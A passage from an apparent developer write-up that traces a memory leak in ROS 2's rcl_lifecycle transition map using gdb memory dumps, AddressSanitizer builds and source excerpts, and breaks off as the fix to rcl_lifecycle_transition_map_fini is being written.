    <span id="cb138-20"><a href="#cb138-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017c0:</span> 0x00007f102f99cb40  0x000000000000000b</span>
    <span id="cb138-21"><a href="#cb138-21" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017d0:</span> 0x000060800002f520  0x0000000000000003</span>
    <span id="cb138-22"><a href="#cb138-22" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb138-23"><a href="#cb138-23" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017e0:</span> 0x00007f102f99cb80  0x000000000000000c</span>
    <span id="cb138-24"><a href="#cb138-24" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017f0:</span> 0x000060800002f720  0x0000000000000003</span>
    <span id="cb138-25"><a href="#cb138-25" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb138-26"><a href="#cb138-26" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001800:</span> 0x00007f102f99cbc0  0x000000000000000d</span>
    <span id="cb138-27"><a href="#cb138-27" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001810:</span> 0x000060800002f5a0  0x0000000000000003</span>
    <span id="cb138-28"><a href="#cb138-28" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb138-29"><a href="#cb138-29" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001820:</span> 0x00007f102f99cc00  0x000000000000000e</span>
    <span id="cb138-30"><a href="#cb138-30" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001830:</span> 0x000060800002f620  0x0000000000000003</span>
    <span id="cb138-31"><a href="#cb138-31" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb138-32"><a href="#cb138-32" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001840:</span> 0x00007f102f99cc40  0x000000000000000f</span>
    <span id="cb138-33"><a href="#cb138-33" aria-hidden="true" tabindex="-1"></a>          <span class="ex">transition_map-</span><span class="op">&gt;</span>states-<span class="op">&gt;</span>valid_transitions</span>
    <span id="cb138-34"><a href="#cb138-34" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001850:</span> [0x0000606000046e20]    0x0000000000000002</span></code></pre></div>
    <p>The element is the last one apparently (<strong>11th</strong> element or [10]). The memory has changed to point to <code>new_valid_transitions</code> and the content now to be freed is:</p>
    <div class="sourceCode" id="cb139"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb139-1"><a href="#cb139-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> transition_map-<span class="op">&gt;</span>states[10]-<span class="op">&gt;</span>valid_transition_size</span>
    <span id="cb139-2"><a href="#cb139-2" aria-hidden="true" tabindex="-1"></a><span class="va">$2</span><span class="ex">1</span> = 2</span>
    <span id="cb139-3"><a href="#cb139-3" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> transition_map-<span class="op">&gt;</span>states[10]-<span class="op">&gt;</span>valid_transitions</span>
    <span id="cb139-4"><a href="#cb139-4" aria-hidden="true" tabindex="-1"></a><span class="va">$1</span><span class="ex">8</span> = <span class="er">(</span><span class="ex">rcl_lifecycle_transition_t</span> <span class="pp">*</span><span class="kw">)</span> <span class="ex">0x606000046e20</span></span>
    <span id="cb139-5"><a href="#cb139-5" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb139-6"><a href="#cb139-6" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">which</span> matches with<span class="kw">)</span></span>
    <span id="cb139-7"><a href="#cb139-7" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb139-8"><a href="#cb139-8" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> <span class="kw">&amp;</span><span class="ex">transition_map-</span><span class="op">&gt;</span>states[10]-<span class="op">&gt;</span>valid_transitions[0]</span>
    <span id="cb139-9"><a href="#cb139-9" aria-hidden="true" tabindex="-1"></a><span class="va">$2</span><span class="ex">5</span> = <span class="er">(</span><span class="ex">rcl_lifecycle_transition_t</span> <span class="pp">*</span><span class="kw">)</span> <span class="ex">0x606000046e20</span></span>
    <span id="cb139-10"><a href="#cb139-10" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> <span class="kw">&amp;</span><span class="ex">transition_map-</span><span class="op">&gt;</span>states[10]-<span class="op">&gt;</span>valid_transitions[1]</span>
    <span id="cb139-11"><a href="#cb139-11" aria-hidden="true" tabindex="-1"></a><span class="va">$2</span><span class="ex">6</span> = <span class="er">(</span><span class="ex">rcl_lifecycle_transition_t</span> <span class="pp">*</span><span class="kw">)</span> <span class="ex">0x606000046e40</span></span></code></pre></div>
    <p>Let’s look at the leaky case: - <code>new_valid_transitions</code>: <code>0x60800002f7a0</code> - <code>state-&gt;valid_transitions</code>: <code>0x606000046e20</code> (both should match after the function). - <code>state</code>: <code>0x613000001840</code></p>
    <p>Before line 139 in transition_map.c:</p>
    <div class="sourceCode" id="cb140"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb140-1"><a href="#cb140-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/44g</span> transition_map-<span class="op">&gt;</span>states</span>
    <span id="cb140-2"><a href="#cb140-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001700:</span> 0x00007f102f99c8e0  0x0000000000000000</span>
    <span id="cb140-3"><a href="#cb140-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001710:</span> 0x0000000000000000  0x0000000000000000</span>
    <span id="cb140-4"><a href="#cb140-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001720:</span> 0x00007f102f99c920  0x0000000000000001</span>
    <span id="cb140-5"><a href="#cb140-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001730:</span> 0x0000606000046d00  0x0000000000000002</span>
    <span id="cb140-6"><a href="#cb140-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001740:</span> 0x00007f102f99c960  0x0000000000000002</span>
    <span id="cb140-7"><a href="#cb140-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001750:</span> 0x000060800002f6a0  0x0000000000000003</span>
    <span id="cb140-8"><a href="#cb140-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001760:</span> 0x00007f102f99c9a0  0x0000000000000003</span>
    <span id="cb140-9"><a href="#cb140-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001770:</span> 0x0000606000046d60  0x0000000000000002</span>
    <span id="cb140-10"><a href="#cb140-10" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001780:</span> 0x00007f102f99c9e0  0x0000000000000004</span>
    <span id="cb140-11"><a href="#cb140-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001790:</span> 0x0000000000000000  0x0000000000000000</span>
    <span id="cb140-12"><a href="#cb140-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017a0:</span> 0x00007f102f99cb00  0x000061300000000a</span>
    <span id="cb140-13"><a href="#cb140-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017b0:</span> 0x000060800002f4a0  0x0000000000000003</span>
    <span id="cb140-14"><a href="#cb140-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017c0:</span> 0x00007f102f99cb40  0x000000000000000b</span>
    <span id="cb140-15"><a href="#cb140-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017d0:</span> 0x000060800002f520  0x0000000000000003</span>
    <span id="cb140-16"><a href="#cb140-16" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017e0:</span> 0x00007f102f99cb80  0x000000000000000c</span>
    <span id="cb140-17"><a href="#cb140-17" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017f0:</span> 0x000060800002f720  0x0000000000000003</span>
    <span id="cb140-18"><a href="#cb140-18" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001800:</span> 0x00007f102f99cbc0  0x000000000000000d</span>
    <span id="cb140-19"><a href="#cb140-19" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001810:</span> 0x000060800002f5a0  0x0000000000000003</span>
    <span id="cb140-20"><a href="#cb140-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001820:</span> 0x00007f102f99cc00  0x000000000000000e</span>
    <span id="cb140-21"><a href="#cb140-21" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001830:</span> 0x000060800002f620  0x0000000000000003</span>
    <span id="cb140-22"><a href="#cb140-22" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001840:</span> 0x00007f102f99cc40  0x000000000000000f</span>
    <span id="cb140-23"><a href="#cb140-23" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001850:</span> 0x0000606000046e20  0x0000000000000003</span></code></pre></div>
    <p>After line 139 in transition_map.c:</p>
    <div class="sourceCode" id="cb141"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb141-1"><a href="#cb141-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/44g</span> transition_map-<span class="op">&gt;</span>states</span>
    <span id="cb141-2"><a href="#cb141-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001700:</span> 0x00007f102f99c8e0  0x0000000000000000</span>
    <span id="cb141-3"><a href="#cb141-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001710:</span> 0x0000000000000000  0x0000000000000000</span>
    <span id="cb141-4"><a href="#cb141-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001720:</span> 0x00007f102f99c920  0x0000000000000001</span>
    <span id="cb141-5"><a href="#cb141-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001730:</span> 0x0000606000046d00  0x0000000000000002</span>
    <span id="cb141-6"><a href="#cb141-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001740:</span> 0x00007f102f99c960  0x0000000000000002</span>
    <span id="cb141-7"><a href="#cb141-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001750:</span> 0x000060800002f6a0  0x0000000000000003</span>
    <span id="cb141-8"><a href="#cb141-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001760:</span> 0x00007f102f99c9a0  0x0000000000000003</span>
    <span id="cb141-9"><a href="#cb141-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001770:</span> 0x0000606000046d60  0x0000000000000002</span>
    <span id="cb141-10"><a href="#cb141-10" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001780:</span> 0x00007f102f99c9e0  0x0000000000000004</span>
    <span id="cb141-11"><a href="#cb141-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001790:</span> 0x0000000000000000  0x0000000000000000</span>
    <span id="cb141-12"><a href="#cb141-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017a0:</span> 0x00007f102f99cb00  0x000061300000000a</span>
    <span id="cb141-13"><a href="#cb141-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017b0:</span> 0x000060800002f4a0  0x0000000000000003</span>
    <span id="cb141-14"><a href="#cb141-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017c0:</span> 0x00007f102f99cb40  0x000000000000000b</span>
    <span id="cb141-15"><a href="#cb141-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017d0:</span> 0x000060800002f520  0x0000000000000003</span>
    <span id="cb141-16"><a href="#cb141-16" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017e0:</span> 0x00007f102f99cb80  0x000000000000000c</span>
    <span id="cb141-17"><a href="#cb141-17" aria-hidden="true" tabindex="-1"></a><span class="ex">0x6130000017f0:</span> 0x000060800002f720  0x0000000000000003</span>
    <span id="cb141-18"><a href="#cb141-18" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001800:</span> 0x00007f102f99cbc0  0x000000000000000d</span>
    <span id="cb141-19"><a href="#cb141-19" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001810:</span> 0x000060800002f5a0  0x0000000000000003</span>
    <span id="cb141-20"><a href="#cb141-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001820:</span> 0x00007f102f99cc00  0x000000000000000e</span>
    <span id="cb141-21"><a href="#cb141-21" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001830:</span> 0x000060800002f620  0x0000000000000003</span>
    <span id="cb141-22"><a href="#cb141-22" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001840:</span> 0x00007f102f99cc40  0x000000000000000f</span>
    <span id="cb141-23"><a href="#cb141-23" aria-hidden="true" tabindex="-1"></a><span class="ex">0x613000001850:</span> 0x000060800002f7a0  0x0000000000000003</span></code></pre></div>
    <p>Indeed, now points to <code>0x60800002f7a0</code>. The content now to be freed is:</p>
    <div class="sourceCode" id="cb142"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb142-1"><a href="#cb142-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> transition_map-<span class="op">&gt;</span>states[10]-<span class="op">&gt;</span>valid_transition_size</span>
    <span id="cb142-2"><a href="#cb142-2" aria-hidden="true" tabindex="-1"></a><span class="va">$2</span><span class="ex">7</span> = 3</span>
    <span id="cb142-3"><a href="#cb142-3" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> <span class="kw">&amp;</span><span class="ex">transition_map-</span><span class="op">&gt;</span>states[10]-<span class="op">&gt;</span>valid_transitions[0]</span>
    <span id="cb142-4"><a href="#cb142-4" aria-hidden="true" tabindex="-1"></a><span class="va">$2</span><span class="ex">8</span> = <span class="er">(</span><span class="ex">rcl_lifecycle_transition_t</span> <span class="pp">*</span><span class="kw">)</span> <span class="ex">0x60800002f7a0</span></span>
    <span id="cb142-5"><a href="#cb142-5" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> <span class="kw">&amp;</span><span class="ex">transition_map-</span><span class="op">&gt;</span>states[10]-<span class="op">&gt;</span>valid_transitions[1]</span>
    <span id="cb142-6"><a href="#cb142-6" aria-hidden="true" tabindex="-1"></a><span class="va">$2</span><span class="ex">9</span> = <span class="er">(</span><span class="ex">rcl_lifecycle_transition_t</span> <span class="pp">*</span><span class="kw">)</span> <span class="ex">0x60800002f7c0</span></span>
    <span id="cb142-7"><a href="#cb142-7" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> <span class="kw">&amp;</span><span class="ex">transition_map-</span><span class="op">&gt;</span>states[10]-<span class="op">&gt;</span>valid_transitions[2]</span>
    <span id="cb142-8"><a href="#cb142-8" aria-hidden="true" tabindex="-1"></a><span class="va">$3</span><span class="ex">0</span> = <span class="er">(</span><span class="ex">rcl_lifecycle_transition_t</span> <span class="pp">*</span><span class="kw">)</span> <span class="ex">0x60800002f7e0</span></span></code></pre></div>
    <p>This somehow matches with:</p>
    <div class="sourceCode" id="cb143"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb143-1"><a href="#cb143-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/96b</span> 0x000060800002f7a0</span>
    <span id="cb143-2"><a href="#cb143-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7a0:</span> 0x80    0xc7    0x99    0x2f    0x10    0x7f    0x00    0x00</span>
    <span id="cb143-3"><a href="#cb143-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7a8:</span> 0x3c    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb143-4"><a href="#cb143-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7b0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb143-5"><a href="#cb143-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7b8:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb143-6"><a href="#cb143-6" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb143-7"><a href="#cb143-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7c0:</span> 0xc0    0xc7    0x99    0x2f    0x10    0x7f    0x00    0x00</span>
    <span id="cb143-8"><a href="#cb143-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7c8:</span> 0x3d    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb143-9"><a href="#cb143-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7d0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb143-10"><a href="#cb143-10" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7d8:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb143-11"><a href="#cb143-11" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb143-12"><a href="#cb143-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7e0:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span>
    <span id="cb143-13"><a href="#cb143-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7e8:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span>
    <span id="cb143-14"><a href="#cb143-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7f0:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span>
    <span id="cb143-15"><a href="#cb143-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x60800002f7f8:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span></code></pre></div>
    <p>Great, so going back to the action plan: - [x] Reach non-leaky, place breakpoint in new_valid_transitions - [x] Determine memory of <code>transition_map-&gt;states</code> and <code>transition_map-&gt;states-&gt;valid_transitions</code> and keep it handy - [x] Record address of state - [x] Validate that state is within transition_map - [x] Record structure of state taking special care for to <code>valid_transitions</code> - [ ] Head to <code>rcl_lifecycle_transition_map_fini</code> and debug memory release</p>
    <p>Now, we need to check whether that memory is released or not (we’d expect it in the first case). Before doing so, let’s make a table with the leaky/non-leaky cases and most relevant values:</p>
    <p>(<em>Note, this is for the first iteration, the one related to <code>nodes.push_back(rclcpp_lifecycle::LifecycleNode::make_shared("foo"));</code>. The second one will have other values.</em>)</p>
    <table>
    <colgroup>
    <col style="width: 54%" />
    <col style="width: 23%" />
    <col style="width: 21%" />
    </colgroup>
    <thead>
    <tr class="header">
    <th></th>
    <th>Non-leaky</th>
    <th>Leaky</th>
    </tr>
    </thead>
    <tbody>
    <tr class="odd">
    <td><code>&amp;transition_map-&gt;states[10]-&gt;valid_transitions[0]</code></td>
    <td><code>0x0000606000046e20</code></td>
    <td><code>0x000060800002f7a0</code></td>
    </tr>
    <tr class="even">
    <td><code>transition_map-&gt;states[10]-&gt;valid_transition_size</code></td>
    <td>2</td>
    <td>3</td>
    </tr>
    <tr class="odd">
    <td><code>transition_map</code></td>
    <td><code>0x613000001548</code></td>
    <td><code>0x613000001548</code></td>
    </tr>
    </tbody>
    </table>
    <p>Let’s head to transition_map.c:52 which is where <code>rcl_lifecycle_transition_map_fini</code> lives. The function itself is pretty straightforward:</p>
    <div class="sourceCode" id="cb144"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb144-1"><a href="#cb144-1" aria-hidden="true" tabindex="-1"></a><span class="dt">rcl_ret_t</span></span>
    <span id="cb144-2"><a href="#cb144-2" aria-hidden="true" tabindex="-1"></a>rcl_lifecycle_transition_map_fini<span class="op">(</span></span>
    <span id="cb144-3"><a href="#cb144-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_lifecycle_transition_map_t</span> <span class="op">*</span> transition_map<span class="op">,</span></span>
    <span id="cb144-4"><a href="#cb144-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="dt">rcutils_allocator_t</span> <span class="op">*</span> allocator<span class="op">)</span></span>
    <span id="cb144-5"><a href="#cb144-5" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb144-6"><a href="#cb144-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">rcl_ret_t</span> fcn_ret <span class="op">=</span> RCL_RET_OK<span class="op">;</span></span>
    <span id="cb144-7"><a href="#cb144-7" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb144-8"><a href="#cb144-8" aria-hidden="true" tabindex="-1"></a>  <span class="co">// free the primary states</span></span>
    <span id="cb144-9"><a href="#cb144-9" aria-hidden="true" tabindex="-1"></a>  allocator<span class="op">-&gt;</span>deallocate<span class="op">(</span>transition_map<span class="op">-&gt;</span>states<span class="op">,</span> allocator<span class="op">-&gt;</span>state<span class="op">);</span></span>
    <span id="cb144-10"><a href="#cb144-10" aria-hidden="true" tabindex="-1"></a>  transition_map<span class="op">-&gt;</span>states <span class="op">=</span> NULL<span class="op">;</span></span>
    <span id="cb144-11"><a href="#cb144-11" aria-hidden="true" tabindex="-1"></a>  <span class="co">// free the tansitions</span></span>
    <span id="cb144-12"><a href="#cb144-12" aria-hidden="true" tabindex="-1"></a>  allocator<span class="op">-&gt;</span>deallocate<span class="op">(</span>transition_map<span class="op">-&gt;</span>transitions<span class="op">,</span> allocator<span class="op">-&gt;</span>state<span class="op">);</span></span>
    <span id="cb144-13"><a href="#cb144-13" aria-hidden="true" tabindex="-1"></a>  transition_map<span class="op">-&gt;</span>transitions <span class="op">=</span> NULL<span class="op">;</span></span>
    <span id="cb144-14"><a href="#cb144-14" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb144-15"><a href="#cb144-15" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> fcn_ret<span class="op">;</span></span>
    <span id="cb144-16"><a href="#cb144-16" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <figure>
    <img src="background/images/2019/09/layout-for-the-rcl-lifecycle-transition-map-fini.png" alt="Layout for the rcl_lifecycle_transition_map_fini" /><figcaption aria-hidden="true">Layout for the rcl_lifecycle_transition_map_fini</figcaption>
    </figure>
    <p><strong>FIRST INTUITION</strong>: It looks like the allocator is freeing <code>transition_map-&gt;states</code> and <code>transition_map-&gt;transitions</code> however, for <code>transition_map-&gt;states</code>, it’s not releasing <code>transition_map-&gt;states-&gt;valid_transitions</code> which was dynamically allocated and populated.</p>
    <p>A closer look into the <code>allocator-&gt;deallocate(transition_map-&gt;states, allocator-&gt;state);</code>:</p>
    <div class="sourceCode" id="cb145"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb145-1"><a href="#cb145-1" aria-hidden="true" tabindex="-1"></a><span class="at">static</span> <span class="dt">void</span></span>
    <span id="cb145-2"><a href="#cb145-2" aria-hidden="true" tabindex="-1"></a>__default_deallocate<span class="op">(</span><span class="dt">void</span> <span class="op">*</span> pointer<span class="op">,</span> <span class="dt">void</span> <span class="op">*</span> state<span class="op">)</span></span>
    <span id="cb145-3"><a href="#cb145-3" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
    <span id="cb145-4"><a href="#cb145-4" aria-hidden="true" tabindex="-1"></a>  RCUTILS_UNUSED<span class="op">(</span>state<span class="op">);</span></span>
    <span id="cb145-5"><a href="#cb145-5" aria-hidden="true" tabindex="-1"></a>  free<span class="op">(</span>pointer<span class="op">);</span></span>
    <span id="cb145-6"><a href="#cb145-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>Let’s make that fix and see how things work out.</p>
    <div class="sourceCode" id="cb146"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb146-1"><a href="#cb146-1" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> build <span class="at">--build-base</span><span class="op">=</span>build-asan <span class="at">--install-base</span><span class="op">=</span>install-asan <span class="dt">\</span></span>
    <span id="cb146-2"><a href="#cb146-2" aria-hidden="true" tabindex="-1"></a>                  <span class="at">--cmake-args</span> <span class="at">-DOSRF_TESTING_TOOLS_CPP_DISABLE_MEMORY_TOOLS</span><span class="op">=</span>ON <span class="dt">\</span></span>
    <span id="cb146-3"><a href="#cb146-3" aria-hidden="true" tabindex="-1"></a>                   <span class="at">-DINSTALL_EXAMPLES</span><span class="op">=</span>OFF <span class="at">-DSECURITY</span><span class="op">=</span>ON <span class="at">--no-warn-unused-cli</span> <span class="dt">\</span></span>
    <span id="cb146-4"><a href="#cb146-4" aria-hidden="true" tabindex="-1"></a>                   <span class="at">-DCMAKE_BUILD_TYPE</span><span class="op">=</span>Debug <span class="at">--mixin</span> asan-gcc <span class="dt">\</span></span>
    <span id="cb146-5"><a href="#cb146-5" aria-hidden="true" tabindex="-1"></a>                  <span class="at">--symlink-install</span> <span class="at">--packages-select</span> rcl_lifecycle</span></code></pre></div>
    <p>When recompiling the workspace, weird thing happening:</p>
    <div class="sourceCode" id="cb147"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb147-1"><a href="#cb147-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@robocalypse:/opt/ros2_ws#</span> colcon build <span class="at">--build-base</span><span class="op">=</span>build-asan <span class="at">--install-base</span><span class="op">=</span>install-asan                   <span class="at">--cmake-args</span> <span class="at">-DOSRF_TESTING_TOOLS_CPP_DISABLE_MEMORY_TOOLS</span><span class="op">=</span>ON                    <span class="at">-DINSTALL_EXAMPLES</span><span class="op">=</span>OFF <span class="at">-DSECURITY</span><span class="op">=</span>ON <span class="at">--no-warn-unused-cli</span>                    <span class="at">-DCMAKE_BUILD_TYPE</span><span class="op">=</span>Debug <span class="at">--mixin</span> asan-gcc                   <span class="at">--symlink-install</span></span>
    <span id="cb147-2"><a href="#cb147-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Starting</span> <span class="op">&gt;&gt;&gt;</span> ros2_ws</span>
    <span id="cb147-3"><a href="#cb147-3" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span> stderr: ros2_ws</span>
    <span id="cb147-4"><a href="#cb147-4" aria-hidden="true" tabindex="-1"></a><span class="ex">CMake</span> Error at CMakeLists.txt:1 <span class="er">(</span><span class="ex">cmake_minimum_required</span><span class="kw">)</span><span class="bu">:</span></span>
    <span id="cb147-5"><a href="#cb147-5" aria-hidden="true" tabindex="-1"></a>  <span class="ex">CMake</span> 3.14 or higher is required.  You are running version 3.10.2</span>
    <span id="cb147-6"><a href="#cb147-6" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb147-7"><a href="#cb147-7" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb147-8"><a href="#cb147-8" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
    <span id="cb147-9"><a href="#cb147-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Failed</span>   <span class="op">&lt;&lt;&lt;</span> ros2_ws    [ Exited with code 1 ]</span>
    <span id="cb147-10"><a href="#cb147-10" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb147-11"><a href="#cb147-11" aria-hidden="true" tabindex="-1"></a><span class="ex">Summary:</span> 0 packages finished [18.6s]</span>
    <span id="cb147-12"><a href="#cb147-12" aria-hidden="true" tabindex="-1"></a>  <span class="ex">1</span> package failed: ros2_ws</span>
    <span id="cb147-13"><a href="#cb147-13" aria-hidden="true" tabindex="-1"></a>  <span class="ex">1</span> package had stderr output: ros2_ws</span></code></pre></div>
    <p>I checked all ROS2 packages an none of them seem to depend on version 3.14. I have no idea why this is happening. Probably some meta information. Same happening in the navigation2_ws. Ok, found why:</p>
    <div class="sourceCode" id="cb148"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb148-1"><a href="#cb148-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@robocalypse:/opt/ros2_navigation2#</span> ls</span>
    <span id="cb148-2"><a href="#cb148-2" aria-hidden="true" tabindex="-1"></a><span class="ex">CMakeLists.txt</span>  build  build-asan  install  install-asan  log  src</span>
    <span id="cb148-3"><a href="#cb148-3" aria-hidden="true" tabindex="-1"></a><span class="ex">root@robocalypse:/opt/ros2_navigation2#</span> rm CMakeLists.txt</span>
    <span id="cb148-4"><a href="#cb148-4" aria-hidden="true" tabindex="-1"></a><span class="ex">root@robocalypse:/opt/ros2_navigation2#</span> ls</span>
    <span id="cb148-5"><a href="#cb148-5" aria-hidden="true" tabindex="-1"></a><span class="ex">build</span>  build-asan  install  install-asan  log  src</span></code></pre></div>
    <p>CLion was creating a CMakeLists.txt file.</p>
    <p>As a workaround anyhow, I found that creating another ws and sourcing it before launching the editor works equally fine.</p>
    <p>Introducing then:</p>
    <div class="sourceCode" id="cb149"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb149-1"><a href="#cb149-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rcl_ret_t</span></span>
    <span id="cb149-2"><a href="#cb149-2" aria-hidden="true" tabindex="-1"></a><span class="ex">rcl_lifecycle_transition_map_fini</span><span class="er">(</span></span>
    <span id="cb149-3"><a href="#cb149-3" aria-hidden="true" tabindex="-1"></a>  <span class="ex">rcl_lifecycle_transition_map_t</span> <span class="pp">*</span> transition_map,</span>
